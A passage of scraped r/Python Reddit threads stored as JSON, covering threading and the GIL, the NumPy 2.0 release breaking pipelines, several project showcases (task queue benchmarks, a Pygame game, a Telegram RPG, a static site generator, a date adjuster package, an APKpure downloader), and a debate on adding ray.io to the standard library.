            "content": "Not quite right. Processes are like individual applications. Each has its own memory and cannot access the memory of others. Multiple processes can run at the same time, but their means of communicating with each other are slower than with threads. Threads all reside within one memory pool, allowing them to directly access each other's data, which is fast. Threads in any language, including Python, can run in parallel. However, in CPython, the most popular implementation of Python, all threads are locked so that only one can execute at a given time. This is a limitation of CPython and perhaps some other interpreters, not the Python language itself. There are plenty of interpreters that have working threads. Tasks normally run within one thread. You need to make an effort to spread them across threads and even more effort to spread them across processes. The idea of a task is that when it pauses, waiting for data from the system, another task runs automatically. Tasks can wait for data in parallel, but waiting is what most servers do most of the time, that is why threads are so useful in servers. Other languages have properly working threads and even green threads (these are a hybrid between threads and tasks; they are tasks running in parallel without being exposed to the OS as threads are). That is why other languages are not as heavily reliant on multiprocessing. However, multiprocessing also allows your program to limit the attack surface and recover from an unhandled exception. That is why Chrome uses multiprocessing.",
            "replies": [
                {
                    "author": "Cool-Focus6556",
                    "score": "3",
                    "content": "Ok, thanks! So threads in some programming languages run in parallel, however in Python it’s restricted by the GIL"
                },
                {
                    "author": "drooltheghost",
                    "score": "3",
                    "content": "Processes can acces the same memory. Use shared memory lib in py."
                },
                {
                    "author": "nekokattt",
                    "score": "3",
                    "content": "I think this is a good description but I'd like to add to this a bit if I may! each has its own memory and cannot access the memory of others This is not always true... in fact on Linux I believe multiprocessing will actually use shared memory in some cases rather than pipes for communication. For the most part this is true though in practise, but it is a technicality rather than an actual given, and depends on your OS! It will be slower though of course! In CPython all threads use the global interpreter lock They are now working on allowing you to turn off the GIL. It is still experimental but has been added to Python 3.13 if I recall. Green threads The main distinction between green threads and async await is that async/await is an explicit syntax where scheduling only occurs when you await something else, whereas green threads are usually a little lower in level and deal with silently switching the program between virtual threads emulating what the OS does but in user space. I mention this because languages like Java still have the concept of futures/tasks that run in virtual/green threads. One can also use green threads in Python if they wish. The gevent library for CPython will let you do this, or if you are using GraalPython, then you have the JVM's virtual threads directly! ===== I think it may also be worth name dropping the concept of multiple interpreters in a process as a middle point between CPython GIL'd threads and CPython multiprocessing. I won't go into too much detail on that for now as it is one to look up if interested!"
                }
            ]
        },
        {
            "author": "Rythoka",
            "score": "2",
            "content": "The concept of threading is deeper than you're letting on. A \"thread\" is simply the idea of having a single program with multiple independently running lines of execution within the same process. A thread will have its own associated state either in the form of its own instruction pointer and stack or in some mechanism that effectively replaces the functionality of them. The threading library allows running code in separate OS threads. These are threads that are managed by the operating system; the OS decides how they're scheduled and prioritized and manages the local state of the threads. The asyncio library allows running code in separate user space threads. The asyncio library itself manages thread scheduling and local state via the event loop and Future objects (Task inherits from Future). This is typically done within a single OS thread, which is advantageous because it can help reduce overhead involved in OS-level operations like context switches. I think it's important to note that asyncio is not the only implementation of user space threads in Python. Twisted and Trio both come to mind. There's also Stackless Python, which is a re-implementation of the Python interpreter designed to allow user-space threads with either cooperative or preemptive scheduling."
        },
        {
            "author": "GuessNope",
            "score": "1",
            "content": "It is highly unlikely that in a true speed-test, brawn-vs-brawn, that coroutines/fibers/user-mode-threads would outperform kernel-mode-threads. Despite their overt similarities they are markedly different strategies that address different bottlenecks. Coroutines enable the asynchronous programming model allowing you to write code like script rather than event-driven finite-state-machines but if you actually code up the event-driven FSM, they will crush the coroutines in performance and scalability. The FSM will complete the task before the coroutine swaps itself onto the stack. It will just take you 30x to 40x times longer to design and code it up. So we only do the FSM thing for real-time controls and core system engines and make the coding easier everywhere else we can. Most web-servers don't take performance to this level; the only one I can remember that tried was a proprietary project called g-wan. If you want to read more about an example performance use-case for coroutines look up the article about Naughty Dog Engine optimizing their PS3 execution. The nature of the PS3 was it had lots of coprocessors so routines spent a lot of time waiting for them to do their work and complete. Performance was NOT the reason browsers went the async-coroutine route. That was for easy-of-use to keep everything in the single-threaded-apartment model because if you go-for true multithreaded then JS programmers have to become system-programmers and webpages would be deadlocking left and right."
        }
    ]
},
{
    "post_author": "commandlineluser",
    "post_id": "1dhtifv",
    "post_score": "579",
    "post_time": "Monday, June 17, 2024 at 11:53:18 AM GMT+3",
    "flair_text": "News",
    "post_title": "NumPy 2.0.0 is the first major release since 2006.",
    "media": [
        "https://numpy.org/devdocs/release/2.0.0-notes.html",
        "https://github.com/numpy/numpy/releases/tag/v2.0.0",
        "https://numpy.org/devdocs/numpy_2_0_migration_guide.html"
    ],
    "post_content": "NumPy 2.0.0 is the first major release since 2006.\nhttps://github.com/numpy/numpy/releases/tag/v2.0.0\nhttps://numpy.org/devdocs/release/2.0.0-notes.html\nhttps://numpy.org/devdocs/numpy_2_0_migration_guide.html",
    "comments": [
        {
            "author": "Capable-Tank-6862",
            "score": "124",
            "content": "Some highlights: np.quantile now supports a 'weights' param np.unique_counts / np.unique_values, which I assume one of them is equivalent to pandas.Series.value_counts(), which will be totally awesome since I find I frequently convert to Series just to use value_counts. weirdly, np.device and np.to_device were added, with only device='cpu' supported. Perhaps numpy is planning to become a Pytorch alternative? StringDtype was added. If you had an array of strings its dtype was usually like \"U58\", indicating it was a varchar up to 58 characters. Now with StringDType it looks like it will be easier to add variable length strings to np arrays. sort and argsort are going to be faster with better implementations.",
            "replies": [
                {
                    "author": "FeLoNy111",
                    "score": "41",
                    "content": "I believe the device thing is just to be standardized with pytorch and jax and what not. In my use case I have code where I pass a numpy-like module as a parameter, so this lets me keep the device line in that code rather than remove it if the module is numpy. But I hope I’m wrong. GPU support built into numpy would be awesome",
                    "replies": [
                        {
                            "author": "jdehesa",
                            "score": "26",
                            "content": "Yes it's probably just for compatibility with array API.",
                            "replies": [
                                {
                                    "author": "priestoferis",
                                    "score": "5",
                                    "content": "TIL about the array API"
                                },
                                {
                                    "author": "rkern",
                                    "score": "4",
                                    "content": "Yes, this is correct."
                                },
                                {
                                    "author": "skytomorrownow",
                                    "score": "2",
                                    "content": "Just reading through the reasoning for the API reminds me why Python and the ecosystem are so well thought out and well executed. Such respect for performance, developer experience, and weaving together community projects rather than consuming them."
                                }
                            ]
                        }
                    ]
                },
                {
                    "author": "BossOfTheGame",
                    "score": "11",
                    "content": "Oh my god they finally added weights to quantile? I've been following that thread forever. I stopped paying attention to it though because no progress was seeming to be made. I'm glad it finally landed."
                }
            ]
        },
        {
            "author": "crawl_dht",
            "score": "288",
            "content": "This is an example of a good governing model for open source libraries. Design your public APIs in such a way that there should be no breaking API changes in a short span of time and there should be minimum LTS branches to maintain. It allows industrial projects to catch up with most of your features and documentation. Then years later you finally revisit your legacy APIs, redesign them and move to version 2 while also maintaining backward compatibility. SQLAlchemy is another library that is built right. I discourage packages which goes from version 1 to version 6+ in a matter of 2 years. It creates too much fragmentation and users are not able to keep up to date with new APIs. High version number should not be seen as an indicator of rapid development.",
            "replies": [
                {
                    "author": "Zomunieo",
                    "score": "81",
                    "content": "It’s also a good example of what happens when an open source project is properly funded through Tidelift and other sources. Many important projects are run or led by a single harried developer who can’t keep up and cuts backward compatibility somewhat abruptly to maintain their sanity — with consequences for the community. If support matters pay for it or get your employer to."
                }
            ]
        },
        {
            "author": "ImaginationPrudent",
            "score": "107",
            "content": "Wake up babe! Math 2 just dropped"
        },
        {
            "author": "wineblood",
            "score": "35",
            "content": "A bunch of CI pipelines are going to break",
            "replies": [
                {
                    "author": "LightShadow",
                    "score": "21",
                    "content": "We had a major outage last night :) pandas not pinning did us dirty."
                }
            ]
        },
        {
            "author": "gopietz",
            "score": "36",
            "content": "Time to fix your requirements.txt",
            "replies": [
                {
                    "author": "draeath",
                    "score": "25",
                    "content": "I wonder how many packages out there have a naieve \"anything newer than X\" spec for numpy that are in for a pile of new issues >.<"
                }
            ]
        },
        {
            "author": "calsina",
            "score": "29",
            "content": "I don't understand the deprecation of np.NaN but I guess I'm force to migrate to np 2.0 !",
            "replies": [
                {
                    "author": "mrdevlar",
                    "score": "42",
                    "content": "I think they just wanted it all lower case, that's all."
                },
                {
                    "author": "ypanagis",
                    "score": "34",
                    "content": "NaN however seemed to me some sort of MatLab legacy. I guess renaming to np.nan is more pythonic, but I might be wrong."
                },
                {
                    "author": "billsil",
                    "score": "3",
                    "content": "Did you understand the difference between np.nan and np.NaN? It seems silly to focus on something like NaN when there is a trivial way to make it compatible with both. I’m rolling the dice on the internal API for now, so could be worse."
                }
            ]
        },
        {
            "author": "Wild_Friendship3823",
            "score": "10",
            "content": "Broke my spacy installation today. Seems spacy didn’t expect it.",
            "replies": [
                {
                    "author": "TA_poly_sci",
                    "score": "3",
                    "content": "Ahh fuck, gonna need to check up on that as well then"
                }
            ]
        },
        {
            "author": "Frizzoux",
            "score": "9",
            "content": "Yes and I broke my packages lol"
        },
        {
            "author": "forayer2",
            "score": "4",
            "content": "This update is wrecking havoc everywhere, many packages did not fix numpy version and are automatically updating to 2.0.0 and breaking. So you're exposed to it even if you don't depend on numpy directly. And most that I saw was just because of stylistic reasons: NaN - > nan",
            "replies": [
                {
                    "author": "akthe_at",
                    "score": "6",
                    "content": "They have been warning for months and months and months"
                }
            ]
        },
        {
            "author": "Coconuts1999",
            "score": "3",
            "content": "Broke my opencv installation today 🙃"
        }
    ]
},
{
    "post_author": "Williamismijnnaam",
    "post_id": "e2234a",
    "post_score": "3232",
    "post_time": "Tuesday, November 26, 2019 at 9:26:29 PM GMT+3",
    "flair_text": "",
    "post_title": "hashtags",
    "media": [
        "https://www.reddit.com/r/elonmusk/comments/e1vtlq/_/",
        "https://preview.redd.it/8ss44ve160141.jpg?width=640&crop=smart&auto=webp&s=e9fc9090ff28cf5a19aa093c92324146431967d2",
        "https://i.redd.it/8ss44ve160141.jpg",
        "https://www.reddit.com/r/elonmusk/"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "badge",
            "score": "158",
            "content": "# is not a hashtag.",
            "replies": [
                {
                    "author": "Endemoniada",
                    "score": "101",
                    "content": "Correct, it is called an octothorp. Edit: Both \"octothorp\" and \"octothorpe\" are valid spellings, but it does appear \"octothorpe\" may be somewhat more popular.",
                    "replies": [
                        {
                            "author": "Etheo",
                            "score": "86",
                            "content": "I like to refer to its other name, pound, as in #metoo.",
                            "replies": [
                                {
                                    "author": "RicealiciousRice",
                                    "score": "10",
                                    "content": "I was just sitting there thinking “hashtag me too? Wtf I don’t get it... AHHHHHHHHHHHHHHHH”"
                                },
                                {
                                    "author": "Meeseeks82",
                                    "score": "20",
                                    "content": "Just heard this joke for the first time the other day from a dad joke enthusiast that looks around and whispers bad words. Was very proud of him."
                                }
                            ]
                        },
                        {
                            "author": "cryo",
                            "score": "5",
                            "content": ""
                        },
                        {
                            "author": "Seirdy",
                            "score": "2",
                            "content": "",
                            "replies": [
                                {
                                    "author": "Endemoniada",
                                    "score": "4",
                                    "content": ""
                                }
                            ]
                        },
                        {
                            "author": "guinader",
                            "score": "0",
                            "content": ""
                        }
                    ]
                },
                {
                    "author": "davidtreynolds",
                    "score": "34",
                    "content": ""
                }
            ]
        },
        {
            "author": "Thecrawsome",
            "score": "22",
            "content": "r/python is full of shitposts now"
        }
    ]
},
{
    "post_author": "tuple32",
    "post_id": "1digyfg",
    "post_score": "16",
    "post_time": "Tuesday, June 18, 2024 at 6:24:26 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Load Tests Python Task Queues",
    "media": [
        "https://github.com/steventen/python_queue_benchmark",
        "https://stevenyue.com/blogs/exploring-python-task-queue-libraries-with-load-test"
    ],
    "post_content": "What My Project Does\nWhile looking for task queues, I found that there are many options available in the Python ecosystem, making it really hard to choose the right one. To get a sense of how each library performs and to help make an informed decision, I conducted a load test on some of the most popular ones: Python-RQ, ARQ, Celery, Huey, and Dramatiq.\nTarget Audience\nI hope my findings can help those who are also looking for a task queue solution in Python.\nComparison\nMost articles out there seem to focus on comparing the features of these libraries but rarely discuss performance. While there could be a lot of improvements on my tests, I think it still provide some different insights into how each library handles heavy loads and concurrency.\nLinks:\nYou can read my findings on my blog\nCheck out the source code: on Github\nThanks",
    "comments": [
        {
            "author": "ekbravo",
            "score": "4",
            "content": "Interesting, great project and write up. I’ve been looking for something like this. Saved for later."
        },
        {
            "author": "riksi",
            "score": "2",
            "content": "You should use something like Locust to benchmark. Like in pgmq https://github.com/tembo-io/pgmq/blob/main/tembo-pgmq-python/benches/locustfile.py"
        },
        {
            "author": "medihack",
            "score": "1",
            "content": "Another gem I found recently is Procrastinate. It's maybe not the fastest (I haven't seen any benchmarks yet) as it is based on PostgreSQL, but it is very well maintained, full of features, and has excellent documentation. From an infrastructure perspective, PostgreSQL might be a plus, too."
        }
    ]
},
{
    "post_author": "DaFluffyPotato",
    "post_id": "ggt5ld",
    "post_score": "3457",
    "post_time": "Sunday, May 10, 2020 at 5:31:23 AM GMT+3",
    "flair_text": "I Made This",
    "post_title": "I'm developing a game with Python and Pygame!",
    "media": [
        "https://preview.redd.it/jogf31rlmux41.gif?width=640&crop=smart&format=png8&s=33ca84e1e126c4783493844016dd392f336a14c2"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "ToothpasteTimebomb",
            "score": "196",
            "content": "The way that water moves... that’s slick."
        },
        {
            "author": "deyehaus",
            "score": "373",
            "content": "This terraria update looks nuts"
        },
        {
            "author": "DaFluffyPotato",
            "score": "140",
            "content": "I do everything myself (artwork included). I'm planning on releasing the source when I release the early version of the game. (should be a couple months or so) I'm also working on a series of devlogs for this project if anyone is interested. This project is actually running in Pygame 2 for this gif, which is part of the reason behind the performance. I'm open to answering any questions! :D"
        },
        {
            "author": "PonyKillerMX",
            "score": "13",
            "content": "Great work man, how long hv u been in this ?"
        },
        {
            "author": "KFUP",
            "score": "23",
            "content": "Not sure how serious you are about polishing this game, but if you are, then I suggest releasing versions early to get feedback before getting too deep and building your game over bad design decisions that will bite you later, for example, the jump looks extremely floaty, there are some good articles about jump feel: http://www.digra.org/wp-content/uploads/digital-library/paper_248.pdf"
        },
        {
            "author": "hamoliciousRUS",
            "score": "11",
            "content": "I love how the water moves! I also just noticed the gusts of wind and how the environment responds to them... amazing!"
        },
        {
            "author": "[deleted]",
            "score": "7",
            "content": "Looks good. How do you do the artwork?"
        },
        {
            "author": "PR3V3X",
            "score": "12",
            "content": "Looks dope. Can you drop the github. I'd love to stay current with it."
        },
        {
            "author": "YoelkiToelki",
            "score": "6",
            "content": "I would love to see the code on how u get the floating leaves in the air to look so smooth and good"
        },
        {
            "author": "petertiny1",
            "score": "6",
            "content": "Whenever I do any pygame, the frame rate instantly dies"
        }
    ]
},
{
    "post_author": "LordOmbro",
    "post_id": "1dftgrl",
    "post_score": "83",
    "post_time": "Friday, June 14, 2024 at 6:24:23 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "I made an MMORPG with Python & Telegram in 4 weeks",
    "media": [
        "https://github.com/SudoOmbro/pilgram"
    ],
    "post_content": "well, kind of.\nI made Pilgram, an infinite idle RPG where your character goes on adventures and notifies you when stuff happens.\nWhat my project does\nThe bot provides a text interface with wich you can \"play\" an MMO RPG, it's basically an online idle adventure game\nTarget audience\nIt's a toy project that i made out of boredom, also it sounded cool\nComparison\nI never heard of anything like this except for some really old browser games. Maybe i'm just not informed.\nMore info\nHow is it infinite? The secret is AI. Every quest and event in the game is generated by AI depending on the demand of the players, so in theory you can go on an infinite amount of quests.\nWhy did i call it an MMO? Because you can kind of play with your friends by creating & joining guilds and by sending gifts to eachother. There even is a guild leaderboard to see who gets the most points :)\nThe interface is exclusively text based, but the command interpreter i wrote is pretty easy to integrate in other places, even in GUIs if anyone wants to try.\nI tried out a lot of new things for this project, like using ORMs, writing unit tests (don't look at those, i kinda got bored after a short while), using AI & writing generic enough code that it can be swapped with any other implementation. I think most of the code i wrote is pretty ok, but you can tell me what to change & what to improve if you want.\nLinks\nhere's the link to the code: https://github.com/SudoOmbro/pilgram\nif you wanna try out the version i'm running on my server start a conversation with pilgram_bot on Telegram, don't expect a balanced experience at first since that was kind of the last of my problems lol",
    "comments": [
        {
            "author": "BestTomatillo6197",
            "score": "198",
            "content": "That title just blows you away until you start reading the details and realize it’s basically a chat room. lol",
            "replies": [
                {
                    "author": "kyle2143",
                    "score": "40",
                    "content": "Tbf, I think everyone kinda assumed that there wasn't gonna be much to the game if it's only been worked on for 4 weeks."
                },
                {
                    "author": "alexshatberg",
                    "score": "4",
                    "content": ""
                }
            ]
        },
        {
            "author": "IAmTarkaDaal",
            "score": "69",
            "content": "",
            "replies": [
                {
                    "author": "ohceedee",
                    "score": "7",
                    "content": ""
                }
            ]
        },
        {
            "author": "pyrotecnix",
            "score": "11",
            "content": "Interesting, you mind adding a license to your repo?"
        },
        {
            "author": "RudyChicken",
            "score": "4",
            "content": "no science based dragons? Pssssh"
        },
        {
            "author": "MonsieurGates",
            "score": "3",
            "content": "Hmmm neat. If you add an interface for discord you could host it and run it via discord. 😁 Then advertise the server as a free discord MUD",
            "replies": [
                {
                    "author": "LordOmbro",
                    "score": "3",
                    "content": "It could be done quite easily actually, the telegram code basically just calls my custom internal command handler wich doesn't care where messages come from. By making a couple small changes to the database structure i could even allow crossplay between any platform :) Thansk for the idea ;)"
                }
            ]
        },
        {
            "author": "dead_alchemy",
            "score": "9",
            "content": "I've seen worse tests. You left a print statement in one which makes me think you are a print debugger - if so try to turn those sessions into quick tests and leave yourself a comment about it (if you know its fragile or flaky remind future you so when it breaks on something stupid you can just delete it or repair it and move on). There may also be testing patterns in python that will make writing quick tests easier. Oh and on that topic I think you can get a lot of value just from checking invariants especially over a range of inputs, invariants being things like the returned value is always positive, or it is never the empty string, or even that a series or inputs always has an increasing/decreasing/changing output. What you have are correctness checks, which can be good but are also higher effort (and tend to be because you want to prove to yourself it works as expected). Testing invariants can be very fast because you typically just need to make a list or range of values that cover your inflection points (like for integer inputs a negative, zero, and positive value tends to cover the vast majority of cases) and then you can apply a uniform test to the function output. I don't know enough to comment fully on the bot and threading code, but it strikes me as odd that they are all using wait to synchronize. Why are they given a wait time at all? That is a timeout, the idea being that if a task gets too old to be relevant that you want to pick back up and do something about it. Oh also in your is killed function get rid of the 'if boolean return true', just return the boolean."
        }
    ]
},
{
    "post_author": "Paradoggs",
    "post_id": "hv2vds",
    "post_score": "3225",
    "post_time": "Tuesday, July 21, 2020 at 10:10:10 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Got my first job as a developer!",
    "media": [],
    "post_content": "Finally!\nAfter 9 months of purely studying and nothing else. Started from absolute 0 and landed my first job in Data Science on a marketing company.\nHave to say it was very hard since I know no developers at all and had no one to ask from help.\nStill feels weird and definitely have a stromg case of imposter syndrome but after writing my forst lines of code it does feel much better!\nSorry for the useless trivia but like I said,have no dev friends so I had to share the excitement somewhere :D",
    "comments": [
        {
            "author": "Paradoggs",
            "score": "570",
            "content": "Brief roadmap since many comments asked for it. I started by buying 2 courses on Udemy, both by Jose Portilla to whom I basically owe my life now. I completed the Bootcamp first which basically teaches you syntax and the basics of Python. It also skims through most advanced topics. Right after completing it I read Automate the Boring Stuff which I consider a must for any beginner python beginner. After that I went on to completing some Katas on codewars.com and started working on my own projects which involved scraping data and using it to perform calculations. Building projects taught me way more than any course ever did. I had to work with pandas, numpy, itertools and many other libraries which I didn't even know existed at that point. When I felt stuck at my project I started reading Dan Bader's Python Tricks book. It made me understand that courses are only the first step to learning and that you havw to read books to actually understand a language in depth. I then continued with the Data Science course on Udemy and kept working on my project. I implemented 2 machine learning models which were very efficent in predicting the data I had. Last step was sending my CV on very remote corner of the industry and failing 10 straight interviews (and losing one due to the pandemic). I as lucky since I landed a job on a company which didn't require experience as much as it valued passion for learning and programming (they still thoroughly checked my projects though)",
            "replies": [
                {
                    "author": "Somedude2024",
                    "score": "64",
                    "content": ""
                }
            ]
        },
        {
            "author": "PhoenixizFire",
            "score": "569",
            "content": ""
        },
        {
            "author": "links-Shield632",
            "score": "58",
            "content": "Congrats"
        },
        {
            "author": "NirmallKiruthik",
            "score": "47",
            "content": "Congratulations. Feels good to hear. Wishes to rise above from what you are right now."
        }
    ]
},
{
    "post_author": "zerojames_",
    "post_id": "1di1v8c",
    "post_score": "57",
    "post_time": "Monday, June 17, 2024 at 7:09:56 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": " Aurora: An extensible Python static site generator ",
    "media": [
        "https://github.com/capjamesg/aurora",
        "https://jamesg.blog/2024/06/16/aurora-isr/"
    ],
    "post_content": "What My Project Does\nAurora is a fast, extensible Python static site generator. With Aurora, I can generate my personal website (~1,700 files, with multiple layers of jinja2 templates for each page) in < 4 seconds. Aurora generated 292,884 pages from a Hacker News post dataset in 2m:20s.\nAurora supports incremental static regeneration, where pages can be regenerated in under 400ms, with hot reloading. I documented how this works on my blog.\nTarget Audience\nI'm building Aurora to help me run my website, but it is built to be general so you can use it for your own projects. I would love feedback!\nI want this to be a tool for running static sites in production, at scale.\nComparison\nAurora is inspired by the folder structure of Jekyll, but is written in Python. It has a hooks API that lets you define custom Python functions that manipulate the state of a page. This allows you to implement custom behaviours in isolation of the engine itself. I use this to open link previews from a cache that I plan to use on my website, among other things.",
    "comments": [
        {
            "author": "eddyizm",
            "score": "5",
            "content": "Definitely gonna check out. Hoping creating a new template is easy."
        },
        {
            "author": "cnelsonsic",
            "score": "4",
            "content": "This looks really cool! Just a heads up, your badges are still markdown at https://capjamesg.github.io/aurora/",
            "replies": [
                {
                    "author": "zerojames_",
                    "score": "1",
                    "content": "Thank you! I plan to make a more comprehensive documentation site (built with Aurora :D), but I need time to think through the design."
                }
            ]
        },
        {
            "author": "BatteLaPesca",
            "score": "3",
            "content": "This seems fucking crazy, i have to try it. GG OP"
        },
        {
            "author": "Benoss",
            "score": "2",
            "content": "I like it, I started a project like that 3x in the last 10 years, cool to see something very close to what I wanted. The 2 main missing things for me out of the box * Cache breaking static files with hash * Image resize This could probably be implemented with a generic way to process files that would allow to take a file on disk as an input and save a processed file with a name in a processed folder with some smarts around caching and incremental building based on the source file hash"
        },
        {
            "author": "lagerbaer",
            "score": "1",
            "content": "Cool cool. One of the things I want in my generator though is stuff like either Tailwind, or compiling bootstrap with custom theming, and I guess for that I'd need node or some other JavaScript shenanigans, right?"
        },
        {
            "author": "Ok-Frosting7364",
            "score": "1",
            "content": "This is cool! Nice work."
        },
        {
            "author": "Electronic_Spell_337",
            "score": "1",
            "content": "Awesome idea, for someone lazy like me."
        }
    ]
},
{
    "post_author": "MDTv_Teka",
    "post_id": "1dg4fkv",
    "post_score": "11",
    "post_time": "Saturday, June 15, 2024 at 2:31:28 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Introducing Temporal Adjusters: Simplify Time Series Adjustments in Python!",
    "media": [
        "https://github.com/gtkacz/temporal_adjusters_py"
    ],
    "post_content": "Hey guys!\nI'm excited to introduce Temporal Adjusters, a new Python package designed to make time series adjustments easier and more efficient. If you work with time series data, you'll find this tool incredibly useful for various temporal adjustments.\nWhat my project does\nAdjusters are a key tool for modifying temporal objects. They exist to externalize the process of adjustment, permitting different approaches, as per the strategy design pattern. Temporal Adjuster provides tools that help pinpoint very specific moments in time, without having to manually count days, weeks, or months. In essence, a Temporal Adjuster is a function that encapsulates a specific date/time manipulation rule. It operates on a temporal object (representing a date, time, or datetime) to produce a new temporal object adjusted according to the rule. Examples might be an adjuster that sets the date avoiding weekends, or one that sets the date to the last day of the month.\nInstallation\nYou can install Temporal Adjuster using pip:\npip install temporal-adjuster\nUsage\nThis package provides a set of predefined temporal adjusters that can be used to adjust a temporal object in various ways. For example:\n>>> from datetime import date, datetime\n\n>>> from temporal_adjuster import TemporalAdjuster\n>>> from temporal_adjuster.common.enums import Weekday\n\n>>> TemporalAdjuster.first_day_of_next_week(date(2021, 1, 1))\ndatetime.date(2021, 1, 4)\n\n>>> TemporalAdjuster.last_day_of_last_month(datetime(2021, 1, 1))\ndatetime.datetime(2020, 12, 31)\n\n>>> TemporalAdjuster.first_of_year(Weekday.SATURDAY, date(2021, 1, 1))\ndatetime.date(2021, 1, 2)\n\n>>> TemporalAdjuster.nth_of_month(Weekday.SUNDAY, datetime(2021, 5, 1), 2)\ndatetime.datetime(2021, 5, 9)\n\n>>> TemporalAdjuster.next(Weekday.MONDAY, datetime(2021, 2, 11), 2)\ndatetime.datetime(2021, 2, 15)\nContributing\nIf you have any suggestions or improvements for pynimbar, feel free to submit a pull request or open an issue on the GitHub repository as per the CONTRIBUTING document. We appreciate any feedback or contributions!\nTarget audience\nThis can be used in production. It has only one depedency, dateutils, which if you're manipulating temporal objects you probably already have. All the code is 100% unit-tested, as well as build tested for all supported Python versions.",
    "comments": [
        {
            "author": "redditusername58",
            "score": "4",
            "content": "",
            "replies": [
                {
                    "author": "redditusername58",
                    "score": "2",
                    "content": ""
                },
                {
                    "author": "MDTv_Teka",
                    "score": "1",
                    "content": ""
                }
            ]
        },
        {
            "author": "marsupiq",
            "score": "3",
            "content": "",
            "replies": [
                {
                    "author": "MDTv_Teka",
                    "score": "2",
                    "content": ""
                },
                {
                    "author": "MDTv_Teka",
                    "score": "1",
                    "content": ""
                }
            ]
        }
    ]
},
{
    "post_author": "jmakov",
    "post_id": "1djdl3q",
    "post_score": "0",
    "post_time": "Wednesday, June 19, 2024 at 10:48:43 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Suggestion: make ray.io a part of Python's std lib",
    "media": [],
    "post_content": "Imagine having the option to write code once and run on multiple cores or on the cluster as part of the std lib. I know there's a company (currently) behind it - Anyscale, also not sure what the license is but other than that, what's holding the Py community back?",
    "comments": [
        {
            "author": "lisael_",
            "score": "56",
            "content": "Very bad idea, especially if you like ray.io. Once it's in std, a library fossilize. It must retain backward-compatibility and each evolution is much harder to land in the code. It's not a critic of the language governance, it's the inherent dynamic of a standard library, whatever language.",
            "replies": [
                {
                    "author": "jmakov",
                    "score": "-18",
                    "content": "",
                    "replies": [
                        {
                            "author": "SV-97",
                            "score": "11",
                            "content": "We already have pyproject.toml for that (PEP 621). But it's optional and many tools still don't support it - python project and dependency management is generally quite the mess."
                        },
                        {
                            "author": "HistoricalCup6480",
                            "score": "12",
                            "content": "This is already a thing. Python projects specify dependencies in pyproject.toml"
                        }
                    ]
                }
            ]
        },
        {
            "author": "Active_Peak7026",
            "score": "29",
            "content": "You'd have to make all the 3'rd party libraries Ray uses part of the stdlib as well, and even if that wasn't the case, there's absolutely no reason or benefit to make such a specific/esoteric library (that's also tightly coupled with some company) part of the stdlib. That's not what the stdlib is for. There are far more popular and useful libraries than Ray, and even they shouldn't be part of the stdlib."
        },
        {
            "author": "zackkitzmiller",
            "score": "10",
            "content": "What? No"
        },
        {
            "author": "proggob",
            "score": "8",
            "content": "I think I want less executing code in the standard library rather than more. And possibly more standard interfaces. Is ray.io overwhelmingly popular in its area of use?",
            "replies": [
                {
                    "author": "jmakov",
                    "score": "-3",
                    "content": "I think it solves the parallel (and distributed) programming problem that Python has in a very nice way."
                }
            ]
        },
        {
            "author": "amarao_san",
            "score": "10",
            "content": "I really want ray.io dependencies on my underpowered arm machine running small python script. It will power up the whole system, eat away battery in just 2 weeks (instead of normal 5 months) and use all space on my small flash device. Suprise, surprise, Python as language has different niches, and bringing stuff for one niche into others is not always good. Look at Rust. They actually, split their std into two parts, the supper essential (core) and std (which has niceness like memory allocation) to allow to use language in places where you can't afford memory allocations.",
            "replies": [
                {
                    "author": "No-Experience-3609",
                    "score": "1",
                    "content": "People struggle to put themselves in other people's shoes."
                }
            ]
        },
        {
            "author": "PM_me_ur_data_",
            "score": "3",
            "content": "Lol did the 11 year olds discover Reddit already?"
        },
        {
            "author": "aceofspaids98",
            "score": "2",
            "content": "You would need to make its dependencies a part of the standard library as well, which includes fastapi, numpy, pandas, and a bunch of others."
        }
    ]
},
{
    "post_author": "ltlbwu",
    "post_id": "1dg2crg",
    "post_score": "13",
    "post_time": "Saturday, June 15, 2024 at 12:53:36 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Created an Api for APKpure",
    "media": [
        "http://apkpure.com/",
        "https://github.com/anishomsy/apkpure"
    ],
    "post_content": "Like the title said. I created an API fro apkpure.com . I was creating a script to automate YouTube Revanced, but i couldn't find anyway to download the apk. You can try out the app here: https://github.com/anishomsy/apkpure\nWhat My Project Does\nIt allows you to download apk from apkpure. Users can easily fetch specific versions of Android apps programmatically.\nTarget Audience\nit is a hobby project, anyone can use it\nComparison\nI did not find any existing alternatives. So I created my own. The only other way was to download it manually which is very tedious.\nPlease lmk how i can improve.\nThank you",
    "comments": [
        {
            "author": "Spitzerkevin",
            "score": "1",
            "content": "Oooh nice, i will try to use it"
        },
        {
            "author": "SignificanceEarly625",
            "score": "1",
            "content": "Let's go 😉"
        },
        {
            "author": "thawancomt",
            "score": "1",
            "content": "I opened an issue, you commit and did not answer, no interaction..."
        }
    ]
},
{
    "post_author": "rvizzz",
    "post_id": "j3hq21",
    "post_score": "3211",
    "post_time": "Friday, October 2, 2020 at 12:28:14 AM GMT+3",
    "flair_text": "Image Processing",
    "post_title": "Recursively flipping and rotating an image. Python source code in comments!",
    "media": [],
    "post_content": "",
    "comments": [
        {
            "author": "rvizzz",
            "score": "95",
            "content": "Source code here: github.com/rvizzz/rotate Fun application of syncing this animation with music!"
        },
        {
            "author": "king-chungus",
            "score": "172",
            "content": "",
            "replies": [
                {
                    "author": "CompletenessTheorem",
                    "score": "60",
                    "content": ""
                }
            ]
        },
        {
            "author": "Envenger",
            "score": "58",
            "content": "My brain hurts but amazing animation.",
            "replies": [
                {
                    "author": "crossroads1112",
                    "score": "21",
                    "content": "I feel like the visualization almost makes it harder to understand, at least for me (though it does look super cool). Thinking about it abstractly, it's easy to see the recursive structure of the problem. How do I rotate a big square? Cut it up into four quadrants and make a recursive call to rotate each of them. The base case once you get down to a 2x2 square is trivial."
                }
            ]
        }
    ]
},
{
    "post_author": "itssimon86",
    "post_id": "1ddc8lq",
    "post_score": "24",
    "post_time": "Tuesday, June 11, 2024 at 2:52:32 PM GMT+3",
    "flair_text": "Showcase",
